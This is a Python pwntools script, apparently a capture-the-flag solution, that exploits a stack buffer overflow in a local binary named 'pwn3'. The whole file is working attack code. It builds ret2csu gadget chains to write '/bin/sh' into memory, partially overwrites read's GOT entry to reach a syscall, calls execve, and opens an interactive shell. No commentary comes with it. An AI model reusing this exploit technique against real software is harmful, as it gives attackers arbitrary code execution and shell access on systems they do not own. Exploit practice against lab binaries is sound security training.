from pwn import *
import time
p=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./pwn3'],env={"LD_PRELOAD":"./libc-2.27.so"})
step1 = 0x00000000004011b2
step2 = 0x0000000000401198
finiptr = 0x402e48

main = 0x401122
writeaddr=0x4040a0
pop_rdi=0x00000000004011bb
pop_rsi_r15=0x00000000004011b9
read_plt=0x0000000000401030
read_got=0x404018
payload=""
payload+="A"*136
payload += p64(step1)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(writeaddr)
payload += p64(17)
payload += p64(finiptr)
payload += p64(step2)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
#payload += p64(pop_rdi)
#payload += p64(0)
payload += p64(read_plt)
payload += p64(main)
p.sendline(payload)
time.sleep(1)
p.sendline("/bin/sh\x00" + p64(read_plt))
payload=""
payload+="A"*136
payload += p64(step1)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(read_got)
payload += p64(1)
payload += p64(finiptr)
payload += p64(step2)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(read_plt)
### starting write call
payload += p64(step1)
payload += p64(0)
payload += p64(1)
payload += p64(1)
payload += p64(0x00404000)
payload += p64(59)
payload += p64(finiptr)
payload += p64(step2)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(read_plt)
payload += p64(step1)
#agaiin 
payload += p64(0)#rbx
payload += p64(1)#rbp
payload += p64(writeaddr)#rdi
payload += p64(0)#rsi
payload += p64(0)#rdx
payload += p64(writeaddr+8)#r15 call
#payload+=p64(finiptr)
payload += p64(step2)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(1)
payload += p64(0x0000000000401150)
#payload+=p64(read_plt)
#payload+=p64(0xdeadbeef)
print len(payload)
pause()
p.send(payload)
time.sleep(1)
p.sendline("\x7f")
p.interactive()
